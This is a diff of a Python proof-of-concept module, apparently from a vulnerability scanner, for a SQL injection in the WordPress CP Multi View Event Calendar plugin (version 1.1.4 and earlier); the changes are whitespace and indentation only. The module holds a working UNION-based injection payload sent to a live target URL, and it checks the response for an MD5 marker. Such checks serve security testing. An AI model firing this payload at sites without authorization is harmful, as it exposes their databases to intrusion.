@@ -6,6 +6,7 @@ import re
 import urllib
 import urllib2
 
+
 class Vuln(ABVuln):
     vuln_id = 'WordPress_0006'  # 平台漏洞编号，留空
     name = 'WordPress CP Multi View Event Calendar 注入'  # 漏洞名称
@@ -22,6 +23,7 @@ class Vuln(ABVuln):
     product = 'WordPress'  # 漏洞应用名称
     product_version = 'CP Multi View Event Calendar <= 1.1.4'  # 漏洞应用版本
 
+
 class Poc(ABPoc):
     poc_id = '25dab31d-bfe9-42ae-91ba-fbd1e6f82a8c'
     author = 'cscan'  # POC编写者
@@ -36,19 +38,20 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             payload = ('/?action=data_management&cpmvc_do_action=mvparse&f=edit&id=1 union all select MD5(233)'
-                        ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#')
+                       ',NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#')
             verify_url = self.target + payload
 
             content = requests.get(verify_url).content
             if 'e165421110ba03099a1c0393373c5b43' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
